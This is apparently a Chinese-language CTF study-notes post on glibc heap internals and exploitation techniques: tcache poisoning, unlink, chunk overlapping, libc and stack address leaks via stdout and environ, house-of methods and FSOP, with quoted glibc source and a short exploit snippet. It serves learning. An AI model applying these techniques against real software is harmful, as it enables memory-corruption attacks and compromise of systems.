堆分配（自己复现）
=========

[一篇讲的比较清楚的博客](https://blog.csdn.net/qq_41453285/article/details/99005759)

malloc函数
--------

说明：first chunk是指bin中链表头部的chunk,last chunk是指bin中链表尾部的chunk。fastbin是LIFO，其他bin是FIFO

1. 判断是否在fastbin大小范围内，如果在则根据malloc的size求出idx；如果fastbin\[idx\]不为空则取first chunk；如果为空，进入unsorted bins大循环
2. 如果不在fastbin大小范围内，判断是否在smallbin大小范围内。如果在则根据malloc的size求出idx；如果smallbin\[idx\]不为空则取last chunk；如果为空,判断smallbin是否初始化。如果已经初始化，那么就进入unsorted bins大循环；如果没有初始化，调用malloc consolidate函数再进入unsorted bins大循环
3. 如果既不在fastbin大小范围内，也不在smallbin大小范围内，判断有无fastchunks。如果没有，进入unsorted bins大循环；如果有，调用malloc consolidate函数再进入unsorted bins大循环 
    - 在后面有了tcache之后，填满tcache再考虑fastbin

malloc consolidate函数
--------------------

- 穷尽合并fastbin里面的chunk并放入unsorted bin中，与top chunk合并的chunk除外 
    1. 遍历整个fastbinY(这是个指针数组,每个元素是一个单向链表的头部),只要整个fastbinY有chunk就遍历。先看prev inuse，如果为0,则unlink prev chunk；如果为1，看next chunk。如果next chunk为top chunk，那就和top chunk合并(和top合并后就直接遍历下一个fastchunk了);如果不是，看next inuse。如果为0，则unlink next chunk；为1就什么都不做。不管next inuse为0还是1，最终都将合并后的chunk插入unsorted bins中
    2. 一直遍历fastbinY直到fastbinY为空，进入unsorted bins大循环

unsorted bins大循环
----------------

- 遍历unsorted bin判断是否有满足条件的unsorted chunk，如果不满足条件就consolidate（将其放入合适的bin中） 
    1. 取last unsorted chunk
    2. 1.如果大小刚好合适，返回这个chunk 2.如果在small bin的大小，chunk进入small bin 3.如果large bin为空，放入large bin中（因为在之前已经判断是否是small bin的大小了）4.前面条件都不满足，从large bin的最后开始寻找这个chunk合适的位置。
    3. 一直遍历unsorted bin直到unsorted bin为空  
        **malloc的时候，不论malloc的大小，首先会去检查每个bins链是否有与malloc相等大小的freechunk。如果没有就去检查bins链中是否有大的freechunk可以切割（除去fastbins链），如果切割，那么就切割大的freechunk，那么切割之后的chunk成为last remainder，并且last remainder会被放入到unsortedbin中（这里往往可以泄露libcbase）**

free函数
------

- 先看能不能放入fastbin，再看能不能进行后向合并与unlink prev chunk，再看能不能和top chunk合并，最后看能不能前向合并与unlink next chunk，不论进不进行前向合并与unlink next chunk，都要放入unsorted bin的头部，之后还有一些检查 
    1. 做一系列检查
    2. 判断chunk大小是否小于max fast，做检查后get fastbin index for the chunksize,然后判断fastbin的first chunk是否是这个chunk（这里应该防止fastbin double free，但是很好绕过），放入fast bin中
    3. 判断chunk是否是mmaped，如果是（目前先不了解）。如果不是，做一系列检查，最重要的就是检查当前的chunk是否是inuse（这也是为什么只有fastbin double free）
    4. 检查通过后，检查prev chunk inuse，如果为0，unlink prev chunk;否则看next chunk：如果next chunk为top chunk，与top chunk合并；否则就看next chunk是否inuse,如果inuse为1，什么都不做；否则进行unlink next chunk,除了和top chunk合并的，都要将new chunk放入unsorted bin头部

概念明晰
----

- bins的链表用的是头插法  
    fd和bk只在bins才有  
    在堆中prev chunk就是比它地址低的，next chunk就是比它地址高的

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-9872fbeb8e38d5aa53fc75b354c4c717f0e05258.png)

- fd,bk指向的chunk的头而不是mem区域
- fastbinsY和bins要区分开来
- 高版本的glibc，如果某个大小的tcache bin满了后再free这个大小的chunk，那么就会尝试进行unlink，如果没满那么是直接放入相应的tcache bin中的
- malloc\_consolidate和unsorted bin大循环不是绑在一起的，而是在malloc的过程中，大部分的malloc\_consolidate后也会进行unsorted bin大循环
- unsorted bin里面的chunk大小&gt;想要分配的大小，并且在其他bin中都没有合适大小的chunk，那么一定会从unsorted bin进行切割分配
- malloc的时候，不论malloc的大小，首先会去检查每个bins链是否有与malloc相等大小的freechunk。如果没有就去检查bins链中是否有大的freechunk可以切割（除去fastbins链），如果切割，那么就切割大的freechunk，那么切割之后的chunk成为last remainder，并且last remainder会被放入到unsortedbin中（这里往往可以泄露libcbase）。 [这篇博客讲的很清楚](https://blog.csdn.net/qq_41453285/article/details/97803141)

basic\_skills
=============

各个bin的大小
--------

以下皆为chunk的大小：  
fastbin:0x20-0x80  
smallbin:&lt;=0x3f0  
largebin:&gt;=0x400  
tcache:0x20-0x410

unlink
------

- unlink 的目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）比如当前Q是使用中的一个chunk，P是Q的prev chunk或者next chunk，如果free(Q),那么在堆空间上P,Q相邻且都被free，要合并这两个chunk,首先要先把P从bin中取出来，因此进行了unlink,unlink是对P进行的操作。
- unlink要绕过的检查,检查有个缺陷，就是 fd/bk 指针都是通过与 chunk 头部的相对地址来查找的

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-6027342a667a9a3cb63eb9a6ff675936090d7c69.png)

off-by-one/off-by-null
----------------------

- 当chunk大小&lt;0x80的时候会直接进入tcache，不会参与unlink
- unlink之后的overlapping chunk都会进入unsorted bin，不论其大小

uaf
---

- 条件：在free掉一块内存后，没有将其置为NULL，紧接着申请大小相同的内存，操作系统会将刚刚free掉的内存再次分配。(为了更高的分配效率)
- glibc 堆分配的策略为first-fit。在分配内存时，malloc 会先到 unsorted bin（或者fastbins） 中查找适合的被 free 的 chunk，如果没有，就会把 unsorted bin 中的所有 chunk 分别放入到所属的 bins 中，然后再去这些 bins 里去找合适的 chunk。

chunk extend and overlapping
----------------------------

- chunk extend 就是通过控制 size 和 prev\_size 域来实现跨越块操作从而导致 overlapping 的
- 漏洞利用条件：漏洞可以控制 chunk header 中的数据（所以经常会结合off-by-one一起用）
- 漏洞作用：一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。
- 利用方法：后向overlapping:一般都是通过修改该chunk的size字段，再将其free，free的时候就对next chunk进行了overlapping。如果再malloc合适大小，就可以得到extend后的chunk，通过edit函数进行控制。而且如果extend后是small bin的大小，会放入unsorted bin中，这时候chunk会有一些有用信息

personal skills
===============

- 注意二级指针，\*的作用是解引用，把它想成访问地址又形象又好理解
- 学会画图很重要
- 注意malloc的大小和实际开辟的chunk的大小
- 传给free的指针应当是指向mem的指针
- tcache中next指针指向的是mem;fastbin的fd指针指向的是chunk header
- 一个指针值为多少它就指向哪里
- 各种bin,tcache都是有一个结构体指针数组，充当着链表头
- 区分&amp;p,p,\*p
- 注意add,edit,show,delete函数的判断条件，这很重要，特别是delete有时候没有任何判断
- 基本上要打hook的情况下，最后都是要通过tcache构造:chunk-&gt;hook，再申请两次向hook里面写入东西
- 要有防止与top chunk合并的意识，每次多分配一个chunk防止与top chunk合并
- 当a是指针变量时，a-&gt;b等价为（&amp;a）.b
- 从 tcache bin 中申请堆块出来需要保证 counts &gt; 0，一般情况下打hook时tcache结构都是1-&gt;0变成1-&gt;hook，counts&gt;0是满足的，当特殊情况是需要留意counts &gt; 0
- 注意到底有没有uaf可以利用,下面这个看似置0了，但是注意是栈上的置0，不影响bss段中的notes

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c7f646d575c1a94f7bd53d37e1325aadce67078c.png)

- 注意fastbin是0x20-0x80,留意打tcache时chunk大小是fastbin
- 一般没有uaf的时候，就必须有off-by-one，不然就无法泄露，除非partial overwrite申请出stdout
- largebin attack最好用之前申请过的，反正总有奇奇怪怪的问题
- 学会伪造fake chunk泄露libcbase这个技巧，想一想free的一些检查，很容易就得到了libcbase
- **当没有edit的时候一定会打chunk overlapping，只有得到一个大的overlapping chunk之后，将其free后再add就可以实现等同于edit的功能，这是一种很常见的技巧**

tricks
======

**1. 泄露libcbase，heapbase**  
**2. 打free\_hook或IO\_FILE**  
[保护机制](https://jkilopu.github.io/2021/05/12/glibc%E5%90%84%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E4%BF%9D%E6%8A%A4/)

泄露heapbase
----------

- 一般想要泄露heapbase的情况比较少见，都是想要修改tcache\_perthread\_struct才泄露。方法也很简单，有show函数直接让tcache结构变成：1-&gt;0,那么show(1)然后再dbg一看算一下相对偏移就行了(或者直接heapbase = heap &amp; 0xFFFFFFFFFFFFF000)

泄露libcbase
----------

- 一般都是通过unsortedbin的特点来泄露libcbase，因此如何绕过题目限制得到一个unsortedbin chunk是核心问题。show出来的是main\_arena附近，直接手动算个偏移就行了
- largebin可以同时泄露libcbase和heapbase，但是要注意泄露后修复largebin
- 有时候也会遇到没有show函数的情况，此时可以打\_\_IO\_2\_1\_stdout

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d6ea75555ec1bf900945816755b8b8d4a821bfc3.png)

- 有时候会没有uaf，这样进入unsorted bin也不是很好泄露。但是可以利用chunk进入unsorted bin或者largebin会向其fd或者bk写入libc地址的特性，再add出来进行泄露就可以了

free\_hook
----------

[可以看看这篇文章](https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/#free-hook)

tcache\_perthread\_struct
-------------------------

- 这个还是很好用的
- 有时候可以add的次数有限或者可以申请的chunk数量有限，所以不能直接用一个循环填满tcache，这时候可以通过修改tcache\_perthread\_struct中的counts数组，也可以达到填满tcache的效果
- 这个是libc2.30以下的tcache\_perthread\_struct结构，counts类型为char

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-ad2e4a614e652bf5e8003cecdb80567a8f6680b1.png)

- libc2.30及以上counts的类型变为unit16\_t，总大小为0x10+2\*0x40+8\*0x40=0x10+0x80+0x200=0x290
- **很显然这个时候要泄露出heapbase**

mp\_结构体
-------

不能使用tcache -&gt; 通过large*bin attack修改mp*.tcache\_bins -&gt; free相应chunk（满足tcache-&gt;counts\[tc\_idx\] &gt; 0） -&gt; 修改tcache的相应entries -&gt; malloc（等同于打了tcache poison）

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-028921288bbe0e00bd339497d4ea7e22d03bb649.png)

tls
---

- 远程可能需要爆破，所以自己基本没打过

stdout
------

- 这个trick在libc2.31以后都比较有用，但是libc2.32加上了tcache的异或后还要泄露heapbase就没那么好用了 
    1. show次数只有一次，这一次显然是泄露libcbase，剩下的泄露要通过tcache poison得到\_IO\_2\_1*stdout*,来泄露\_environ,得到retaddr来进行rop。

```python
stdout = libc_base + libc.sym['_IO_2_1_stdout_']
environ = libc_base + libc.sym['environ']
delete(7)
add(0x80,'aaaa') #0
delete(8)
add(0x70,'aaaa') #1
add(0x90,p64(0)+p64(0x91)+p64(stdout)) #2
add(0x80,'aaaa') #3
#利用stdout泄露出stack_addr
add(0x80,p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+8)) #4
```

2. show虽然有多次但是还是要泄露\_environ来进行rop
3. 没有show函数，存在off-by-null，这样可以覆盖\_IO\_2\_1\_stdout\_的\_IO\_write\_base最低字节为\\x00，也可以泄露libcbase

calloc函数的trick
--------------

```C
size = read(0, s, 0x400uLL);
  if ( size <= 0 )
    error("io");
  s[size - 1] = 0;
  if ( size <= 0x7F || size > 0x400 )
    error("poor hero name");
  *((_QWORD *)&chunklist + 2 * idx) = calloc(1uLL, size);
```

- 如果往栈上写入rop，并且打malloc\_hook，可以找一个magic gadget,如下所示，将rip指向rop链，也进行了函数执行的控制。
- 这种gadget要自己到libc.so文件里面找

```text
magic_gadget = libc_base + libc.sym['setcontext']+53
add rsp, 0x48 ; ret
```

environ
-------

```python
stdout = libc_base + libc.sym['_IO_2_1_stdout_']
environ = libc_base + libc.sym['environ']
delete(7)
add(0x80,'aaaa') #0
delete(8)
add(0x70,'aaaa') #1
add(0x90,p64(0)+p64(0x91)+p64(stdout)) #2
add(0x80,'aaaa') #3
#利用stdout泄露出stack_addr
add(0x80,p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+8)) #4
```

- 在Linux C中，environ是一个全局变量，它储存着系统的环境变量。,它储存在libc中,因此environ是沟通libc地址与栈地址的桥梁.通过libc找到environ地址后，泄露environ地址处的值，可以得到环境变量地址，环境变量保存在栈中，通过偏移可以得到栈上任意变量的地址。
- 得到栈地址后要自己dbg算出retaddr，栈中相对偏移是不变的

scanf的trick
-----------

- 使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。因此可以调用malloc consolidate函数实现合并fastchunks到unsorted bin进而泄露libc

```python
createlarge(0x400*'1')
```

保护机制变动
======

[一篇讲这个的博客](https://www.roderickchan.cn/zh-cn/2023-03-01-analysis-of-glibc-heap-exploitation-in-high-version/#1-1-tcachebin)  
[house系列](https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/)

- tcachebin 堆指针异或加密（glibc-2.32 引入）
- fastbin 堆指针异或加密（glibc-2.32 引入）
- 堆内存对齐检查（glibc-2.32 引入）
- tcahebin 链的数量检查（glibc-2.33 引入）
- 移除\_\_malloc\_hook 和\_\_free\_hook（glibc-2.34 引入）
- 引入 tcache\_key 作为 tcache 的 key 检查（glibc-2.34 引入）
- \_\_malloc\_assert 移除掉 IO 处理函数（glibc-2.36 引入）
- 移除\_\_malloc\_assert 函数（glibc-2.37 引入）
- 将 global\_max\_fast 的数据类型修改为 uint8\_t（glibc-2.37 引入）

打法总述
====

[打法总述](https://roderickchan.github.io/zh-cn/2023-03-01-analysis-of-glibc-heap-exploitation-in-high-version/#1-%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F)  
**笔者对于这些攻击手法感觉不是很难，难的地方在于堆风水**

有无off-by-null
-------------

- 一般没有uaf都是会有off-by-null可以利用进行chunk overlapping 一起到unsorted bin中
- 没有off-by-null并且没有edit一般都是打tcache了，house of botcake,这时候打tcache poison主要是通过add时候的read进行
- 打tcache有时候会和fastbin联动，不能把思维局限在tcache，fastbin也有很大的用途
- uaf和off-by-one/null都没有考虑idx负数溢出
- 还要考虑double free

是否进行orw
-------

**如果申请的chunk大小限制在0x30这种大小左右，很难布置IO链，这时候一般都是打栈溢出**  
**如果申请的次数没有什么限制，就不需要打tcache\_perthread，否则通过打tcache\_perthread实现多次申请任意地址，任意地址申请受限制时总是容易忘记打这个结构**  
**泄露栈地址也有两种方法，第一种时是把environ申请出来然后show，第二种是申请IO\_2\_1\_stdout，然后通过stdout泄露出栈地址**  
[参考博客](https://www.anquanke.com/post/id/236832#h3-8)

- 如果不进行libc2.31打hook即可，libc2.35打apple2这条链
- 还可以打栈溢出，如果只能largebin attack这种很难任意地址申请和泄露的，那么一般就打IO了。但如果明显可以任意地址申请和泄露，直接泄露栈地址无疑可以更快地进行orw，**同时做题的时候发现libc2.31竟然不会对tcache是否是0x10对齐做检查!!!**
- 如果进行，libc2.31利用 getkeyserv\_handle+576

```text
mov     rdx, [rdi+8]
mov     [rsp+0C8h+var_C8], rax
call    qword ptr [rdx+20h]
```

- 发现libc2.31也有 svcudp\_reply+26这个gadget,那其实也可以打house of apple2这条链了

```text
.text:0000000000157BFA                 mov     rbp, [rdi+48h]
.text:0000000000157BFE                 mov     rax, [rbp+18h]
.text:0000000000157C02                 lea     r13, [rbp+10h]
.text:0000000000157C06                 mov     dword ptr [rbp+10h], 0
.text:0000000000157C0D                 mov     rdi, r13
.text:0000000000157C10                 call    qword ptr [rax+28h]
```

- libc2.34及以下还可以打house of kiwi，house of emma太麻烦了一般都没啥人打
- libc2.35如果打FROP用apple2特有的链，如果打malloc\_assert用house of cat

libc2.27-libc2.31
-----------------

- tcache-key存的是heapbase+0x10
- 此时主要是打tcache,而且tcache poison相对简单
- 利用off-by-one
- 利用unsorted bin实现等价于edit的功能
- house of botcake
- tcache\_perthread\_struct
- stdout
- environ变量

libc2.34以下
----------

此时还没有移除hook，仍然可以打各种hooks

- decrypt safe unlink，tcache poison有了异或加密，泄露heapbase绕过即可
- large*bin attack修改mp*.tcache\_bins让largebin chunk进入tcache
- tls中管理tcache的变量(search -p heapbase+0x10)来实现任意分配注意想要调用FSOP中\_IO\_OVERFLOW函数，要满足fp-&gt;\_mode &lt;= 0 &amp;&amp; fp-&gt;\_IO\_write\_ptr &gt; fp-&gt;\_IO\_write\_base,以及\_lock为一个可写地址
- house of pig 结合largebin attack和tcache stashing unlink attack，利用\_IO\_str\_overflow的malloc,memcpy,free三连
- house of pig plus 利用\_IO\_str\_overflow中这条指令mov rdx,QWORD PTR \[rdi+0x28\]，可以设置rdx。同时利用三连让malloc\_hook为setcontent+61,进行srop

libc2.34及以上
-----------

在2.36以下还没有移除assert，2.36及以上就没有assert了

- house of kiwi 必须要有assert,同时\_IO\_file\_jumps要可写才行
- house of emma 要能FSOP或者assert,主要是用vtable调用函数是通过偏移还没有检查这个漏洞，调用\_IO\_cookie\_write并且覆盖cookie\_io\_functions\_t \_\_io\_functions为目标函数 **如果是FSOP会调用**overflow，如果是assert会调用**sync，注意设置好偏移执行目标函数**。但是house of emma还需要绕过一个函数，因此还要用largebin attack劫持pointer guard，远程可能还需要爆破。所以这个攻击手法基本不打
- house of apple1，利用\_wide\_data再结合\_IO\_wstrn\_overflow可以任意地址写任意值，再结合各种技巧来打
- **house of apple2 简单又实用，有三条链都可以打，区别不是很大，自己固定打\_IO\_wfile\_overflow**
- house of cat

杂记
--

- exit()的使用
- house of husk
- 有时候不要只想着构造堆风水，非要实现任意地址申请，有的堆题本质就是栈溢出，甚至是ret2libc打法，不要将思维局限了

IO Basic Knowledge
==================

**\_IO\_list\_all、 \_IO\_2\_1\_stderr、 stderr**

FSOP
----

- FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的\_IO\_FILE 结构会使用\_chain 域相互连接形成一个链表，这个链表的头部由\_IO\_list\_all 维护。
- FSOP 的核心思想就是劫持\_IO\_list\_all 的值来伪造链表和其中的\_IO\_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用\_IO\_flush\_all\_lockp，这个函数会刷新\_IO\_list\_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用\_IO\_FILE\_plus.vtable 中的\_IO\_overflow

```C
typedef int (*_IO_overflow_t) (FILE *, int);
#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)   \
                 + (THIS)->_vtable_offset)))

#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)
#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)
#define _IO_WIDE_JUMPS(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
```

- \_IO\_flush\_all\_lockp

```C
#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
int _IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  FILE *fp;
#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif
  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      if (do_lock)
        _IO_flockfile (fp);
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
       || (_IO_vtable_offset (fp) == 0
           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base))
       )
      && _IO_OVERFLOW (fp, EOF) == EOF) 
    //调用 vtable中的 overflow指针
    result = EOF;

      if (do_lock)
       _IO_funlockfile (fp);
      run_fp = NULL;
    }

#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock (list_all_lock);
  _IO_cleanup_region_end (0);
#endif
  return result;
}
```

而\_IO\_flush\_all\_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：

1. 当 libc 执行 abort 流程时
2. 当执行 exit 函数时
3. 当执行流从 main 函数返回时

**需要满足的条件**

```text
1. _IO_list_all写入一个可控堆地址
2.  FAKE FILE+0x88(_IO_lock_t *_lock)的值=writable addr
3.  FAKE FILE+0xc0(fp->_mode)的值=0
4.  FAKE FILE+0x28的值>FAKE FILE+0x20的值（fp->_IO_write_ptr > fp->_IO_write_base）
```

\_IO\_flockfile
---------------

**因此fp-&gt;\_lock要填入一个可写地址**

```C
# define _IO_flockfile(_fp) \
  if (((_fp)->_flags & _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)->_lock)

#define _IO_lock_lock(_name)    __libc_lock_lock_recursive (_name)

#define __libc_lock_lock_recursive(NAME)   \
  ({   \
     __libc_lock_recursive_t *const __lock = &(NAME);   \
     void *__self = __libc_lock_owner_self ();   \
     if (__self != __lock->owner)   \
       {   \
         lll_lock (__lock->lock, 0);   \
         __lock->owner = __self;   \
       }   \
     ++__lock->cnt;   \
     (void)0;   \
   })
```

\_\_malloc\_assert
------------------

**目前的理解用malloc\_assert都是要修改stderr**  
**只有house of kiwi用fflush (stderr)**  
**其他的house系列都用\_\_fxprintf**

- 触发malloc\_assert  
    large bin attack 去篡改 top chunk 的 size 将其改为非法（要往小了改，因为只有 top chunk 无法满足要申请的 size 时，才会触发 sysmalloc） 注意 large bin attack 想将 top chunk 的 size 改小的话，需要地址错位

```C
  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));

  /* Precondition: not enough current space to satisfy nb request */
  assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
```

```C
static void
__malloc_assert (const char *assertion, const char *file, unsigned int line,
       const char *function)
{
(void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
           __progname, __progname[0] ? ": " : "",
           file, line,
           function ? function : "", function ? ": " : "",
           assertion);
fflush (stderr);
abort ();
}
```

**这里有这样一条执行链 **malloc\_assert-&gt; **fxprintf-&gt;**vfxprintf-&gt;locked\_vfxprintf-&gt;**vfprintf\_internal-&gt;\_IO\_file\_xsputn,但要注意这个是stderr的vtable**

```C
int
__fxprintf (FILE *fp, const char *fmt, ...)
{
  va_list ap;
  va_start (ap, fmt);
  int res = __vfxprintf (fp, fmt, ap, 0);
  va_end (ap);
  return res;
}
```

```C
__vfxprintf (FILE *fp, const char *fmt, va_list ap,
         unsigned int mode_flags)
{
  if (fp == NULL)
    fp = stderr;
  _IO_flockfile (fp);//在这个地方会有一个检查，我们需要回复lock字段的值
  int res = locked_vfxprintf (fp, fmt, ap, mode_flags);
  _IO_funlockfile (fp);
  return res;
}

locked_vfxprintf (FILE *fp, const char *fmt, va_list ap,
          unsigned int mode_flags)
{
  if (_IO_fwide (fp, 0) <= 0)
    return __vfprintf_internal (fp, fmt, ap, mode_flags);
}

vfprintf (FILE *s, const CHAR_T *format, va_list ap, unsigned int mode_flags)
{
    ...
        经过一系列跳转到执行了IO_validate_vtable
}

IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    _IO_vtable_check ();
  return vtable; 调用vtable表中偏移0x38的位置

}

```

- fflush (stderr)

```C
# define fflush(s) _IO_fflush (s)
int
_IO_fflush (FILE *fp)
{
  if (fp == NULL)
    return _IO_flush_all ();
  else
    {
      int result;
      CHECK_FILE (fp, EOF);
      _IO_acquire_lock (fp);
      result = _IO_SYNC (fp) ? EOF : 0;
      _IO_release_lock (fp);
      return result;
    }
}
```

\_IO\_jump\_t
-------------

```C
struct _IO_jump_t
{
   0 JUMP_FIELD(size_t, __dummy);
   0x8 JUMP_FIELD(size_t, __dummy2);
   0x10 JUMP_FIELD(_IO_finish_t, __finish);
   0x18 JUMP_FIELD(_IO_overflow_t, __overflow);
   0x20 JUMP_FIELD(_IO_underflow_t, __underflow);
   0x28 JUMP_FIELD(_IO_underflow_t, __uflow);
   0x30 JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
   0x38 JUMP_FIELD(_IO_xsputn_t, __xsputn);
   0x40 JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
   0x48 JUMP_FIELD(_IO_seekoff_t, __seekoff);
   0x50 JUMP_FIELD(_IO_seekpos_t, __seekpos);
   0x58 JUMP_FIELD(_IO_setbuf_t, __setbuf);
   0x60 JUMP_FIELD(_IO_sync_t, __sync);
   0x68 JUMP_FIELD(_IO_doallocate_t, __doallocate);
   0x70 JUMP_FIELD(_IO_read_t, __read);
   0x78 JUMP_FIELD(_IO_write_t, __write);
   0x80 JUMP_FIELD(_IO_seek_t, __seek);
   0x88 JUMP_FIELD(_IO_close_t, __close);
   0x90 JUMP_FIELD(_IO_stat_t, __stat);
   0x98 JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
   0x100 JUMP_FIELD(_IO_imbue_t, __imbue);
};
```

\_\_io\_vtables
---------------

```C
extern const struct _IO_jump_t __io_vtables[] attribute_hidden;
#define _IO_str_jumps                    (__io_vtables[IO_STR_JUMPS])
#define _IO_wstr_jumps                   (__io_vtables[IO_WSTR_JUMPS])
#define _IO_file_jumps                   (__io_vtables[IO_FILE_JUMPS])
#define _IO_file_jumps_mmap              (__io_vtables[IO_FILE_JUMPS_MMAP])
#define _IO_file_jumps_maybe_mmap        (__io_vtables[IO_FILE_JUMPS_MAYBE_MMAP])
#define _IO_wfile_jumps                  (__io_vtables[IO_WFILE_JUMPS])
#define _IO_wfile_jumps_mmap             (__io_vtables[IO_WFILE_JUMPS_MMAP])
#define _IO_wfile_jumps_maybe_mmap       (__io_vtables[IO_WFILE_JUMPS_MAYBE_MMAP])
#define _IO_cookie_jumps                 (__io_vtables[IO_COOKIE_JUMPS])
#define _IO_proc_jumps                   (__io_vtables[IO_PROC_JUMPS])
#define _IO_mem_jumps                    (__io_vtables[IO_MEM_JUMPS])
#define _IO_wmem_jumps                   (__io_vtables[IO_WMEM_JUMPS])
#define _IO_printf_buffer_as_file_jumps  (__io_vtables[IO_PRINTF_BUFFER_AS_FILE_JUMPS])
#define _IO_wprintf_buffer_as_file_jumps (__io_vtables[IO_WPRINTF_BUFFER_AS_FILE_JUMPS])
#define _IO_old_file_jumps               (__io_vtables[IO_OLD_FILE_JUMPS])
#define _IO_old_proc_jumps               (__io_vtables[IO_OLD_PROC_JUMPS])
#define _IO_old_cookie_jumps             (__io_vtables[IO_OLD_COOKIED_JUMPS])
```

\_IO\_wide\_data
----------------

```C
struct _IO_wide_data
{
  0 wchar_t *_IO_read_ptr;    /* Current read pointer */
  0x8 wchar_t *_IO_read_end;    /* End of get area. */
  0x10 wchar_t *_IO_read_base;    /* Start of putback+get area. */
  0x18 wchar_t *_IO_write_base;    /* Start of put area. */
  0x20 wchar_t *_IO_write_ptr;    /* Current put pointer. */
  0x28 wchar_t *_IO_write_end;    /* End of put area. */
  0x30 wchar_t *_IO_buf_base;    /* Start of reserve area. */
  0x38 wchar_t *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  0x40 wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */
  0x48 wchar_t *_IO_backup_base;    /* Pointer to first valid character of
                   backup area */
  0x50 wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
  wchar_t _shortbuf[1];
  0xe0 const struct _IO_jump_t *_wide_vtable;
};
```

\_IO\_FILE
----------

```C
struct _IO_FILE
{
 0 int _flags;      /* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
 0x8 char *_IO_read_ptr;    /* Current read pointer */
 0x10 char *_IO_read_end;   /* End of get area. */
 0x18 char *_IO_read_base;  /* Start of putback+get area. */
 0x20 char *_IO_write_base; /* Start of put area. */
 0x28 char *_IO_write_ptr;  /* Current put pointer. */
 0x30 char *_IO_write_end;  /* End of put area. */
 0x38 char *_IO_buf_base;   /* Start of reserve area. */
 0x40 char *_IO_buf_end;    /* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
 0x48 char *_IO_save_base; /* Pointer to start of non-current get area. */
 0x50 char *_IO_backup_base;  /* Pointer to first valid character of backup area */
 0x58 char *_IO_save_end; /* Pointer to end of non-current get area. */

 0x60 struct _IO_marker *_markers;

 0x68 struct _IO_FILE *_chain;

 0x70 int _fileno;
 0x78 int _flags2;
 0x80 __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  0x88 _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

struct _IO_FILE_complete
{
  struct _IO_FILE_file;
#endif
 0x90 __off64_t _offset;
  /* Wide character stream stuff.  */
 0x98 struct _IO_codecvt *_codecvt;
 0xa0 struct _IO_wide_data *_wide_data;
 0xa8 struct _IO_FILE *_freeres_list;
 0xb0 void *_freeres_buf;
 0xb8 size_t __pad5;
 0xc0 int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
 0xd8 vtable;
};
```

- 大部分的命名和常规认识是一致的，这里需要格外注意的是flags

\_IO\_list\_all
---------------

- 略

\_IO\_FILE\_plus
----------------

```C
struct _IO_FILE_plus
{
  FILE file;
  const struct _IO_jump_t *vtable;
};

#ifdef _IO_USE_OLD_IO_FILE

struct _IO_FILE_complete_plus
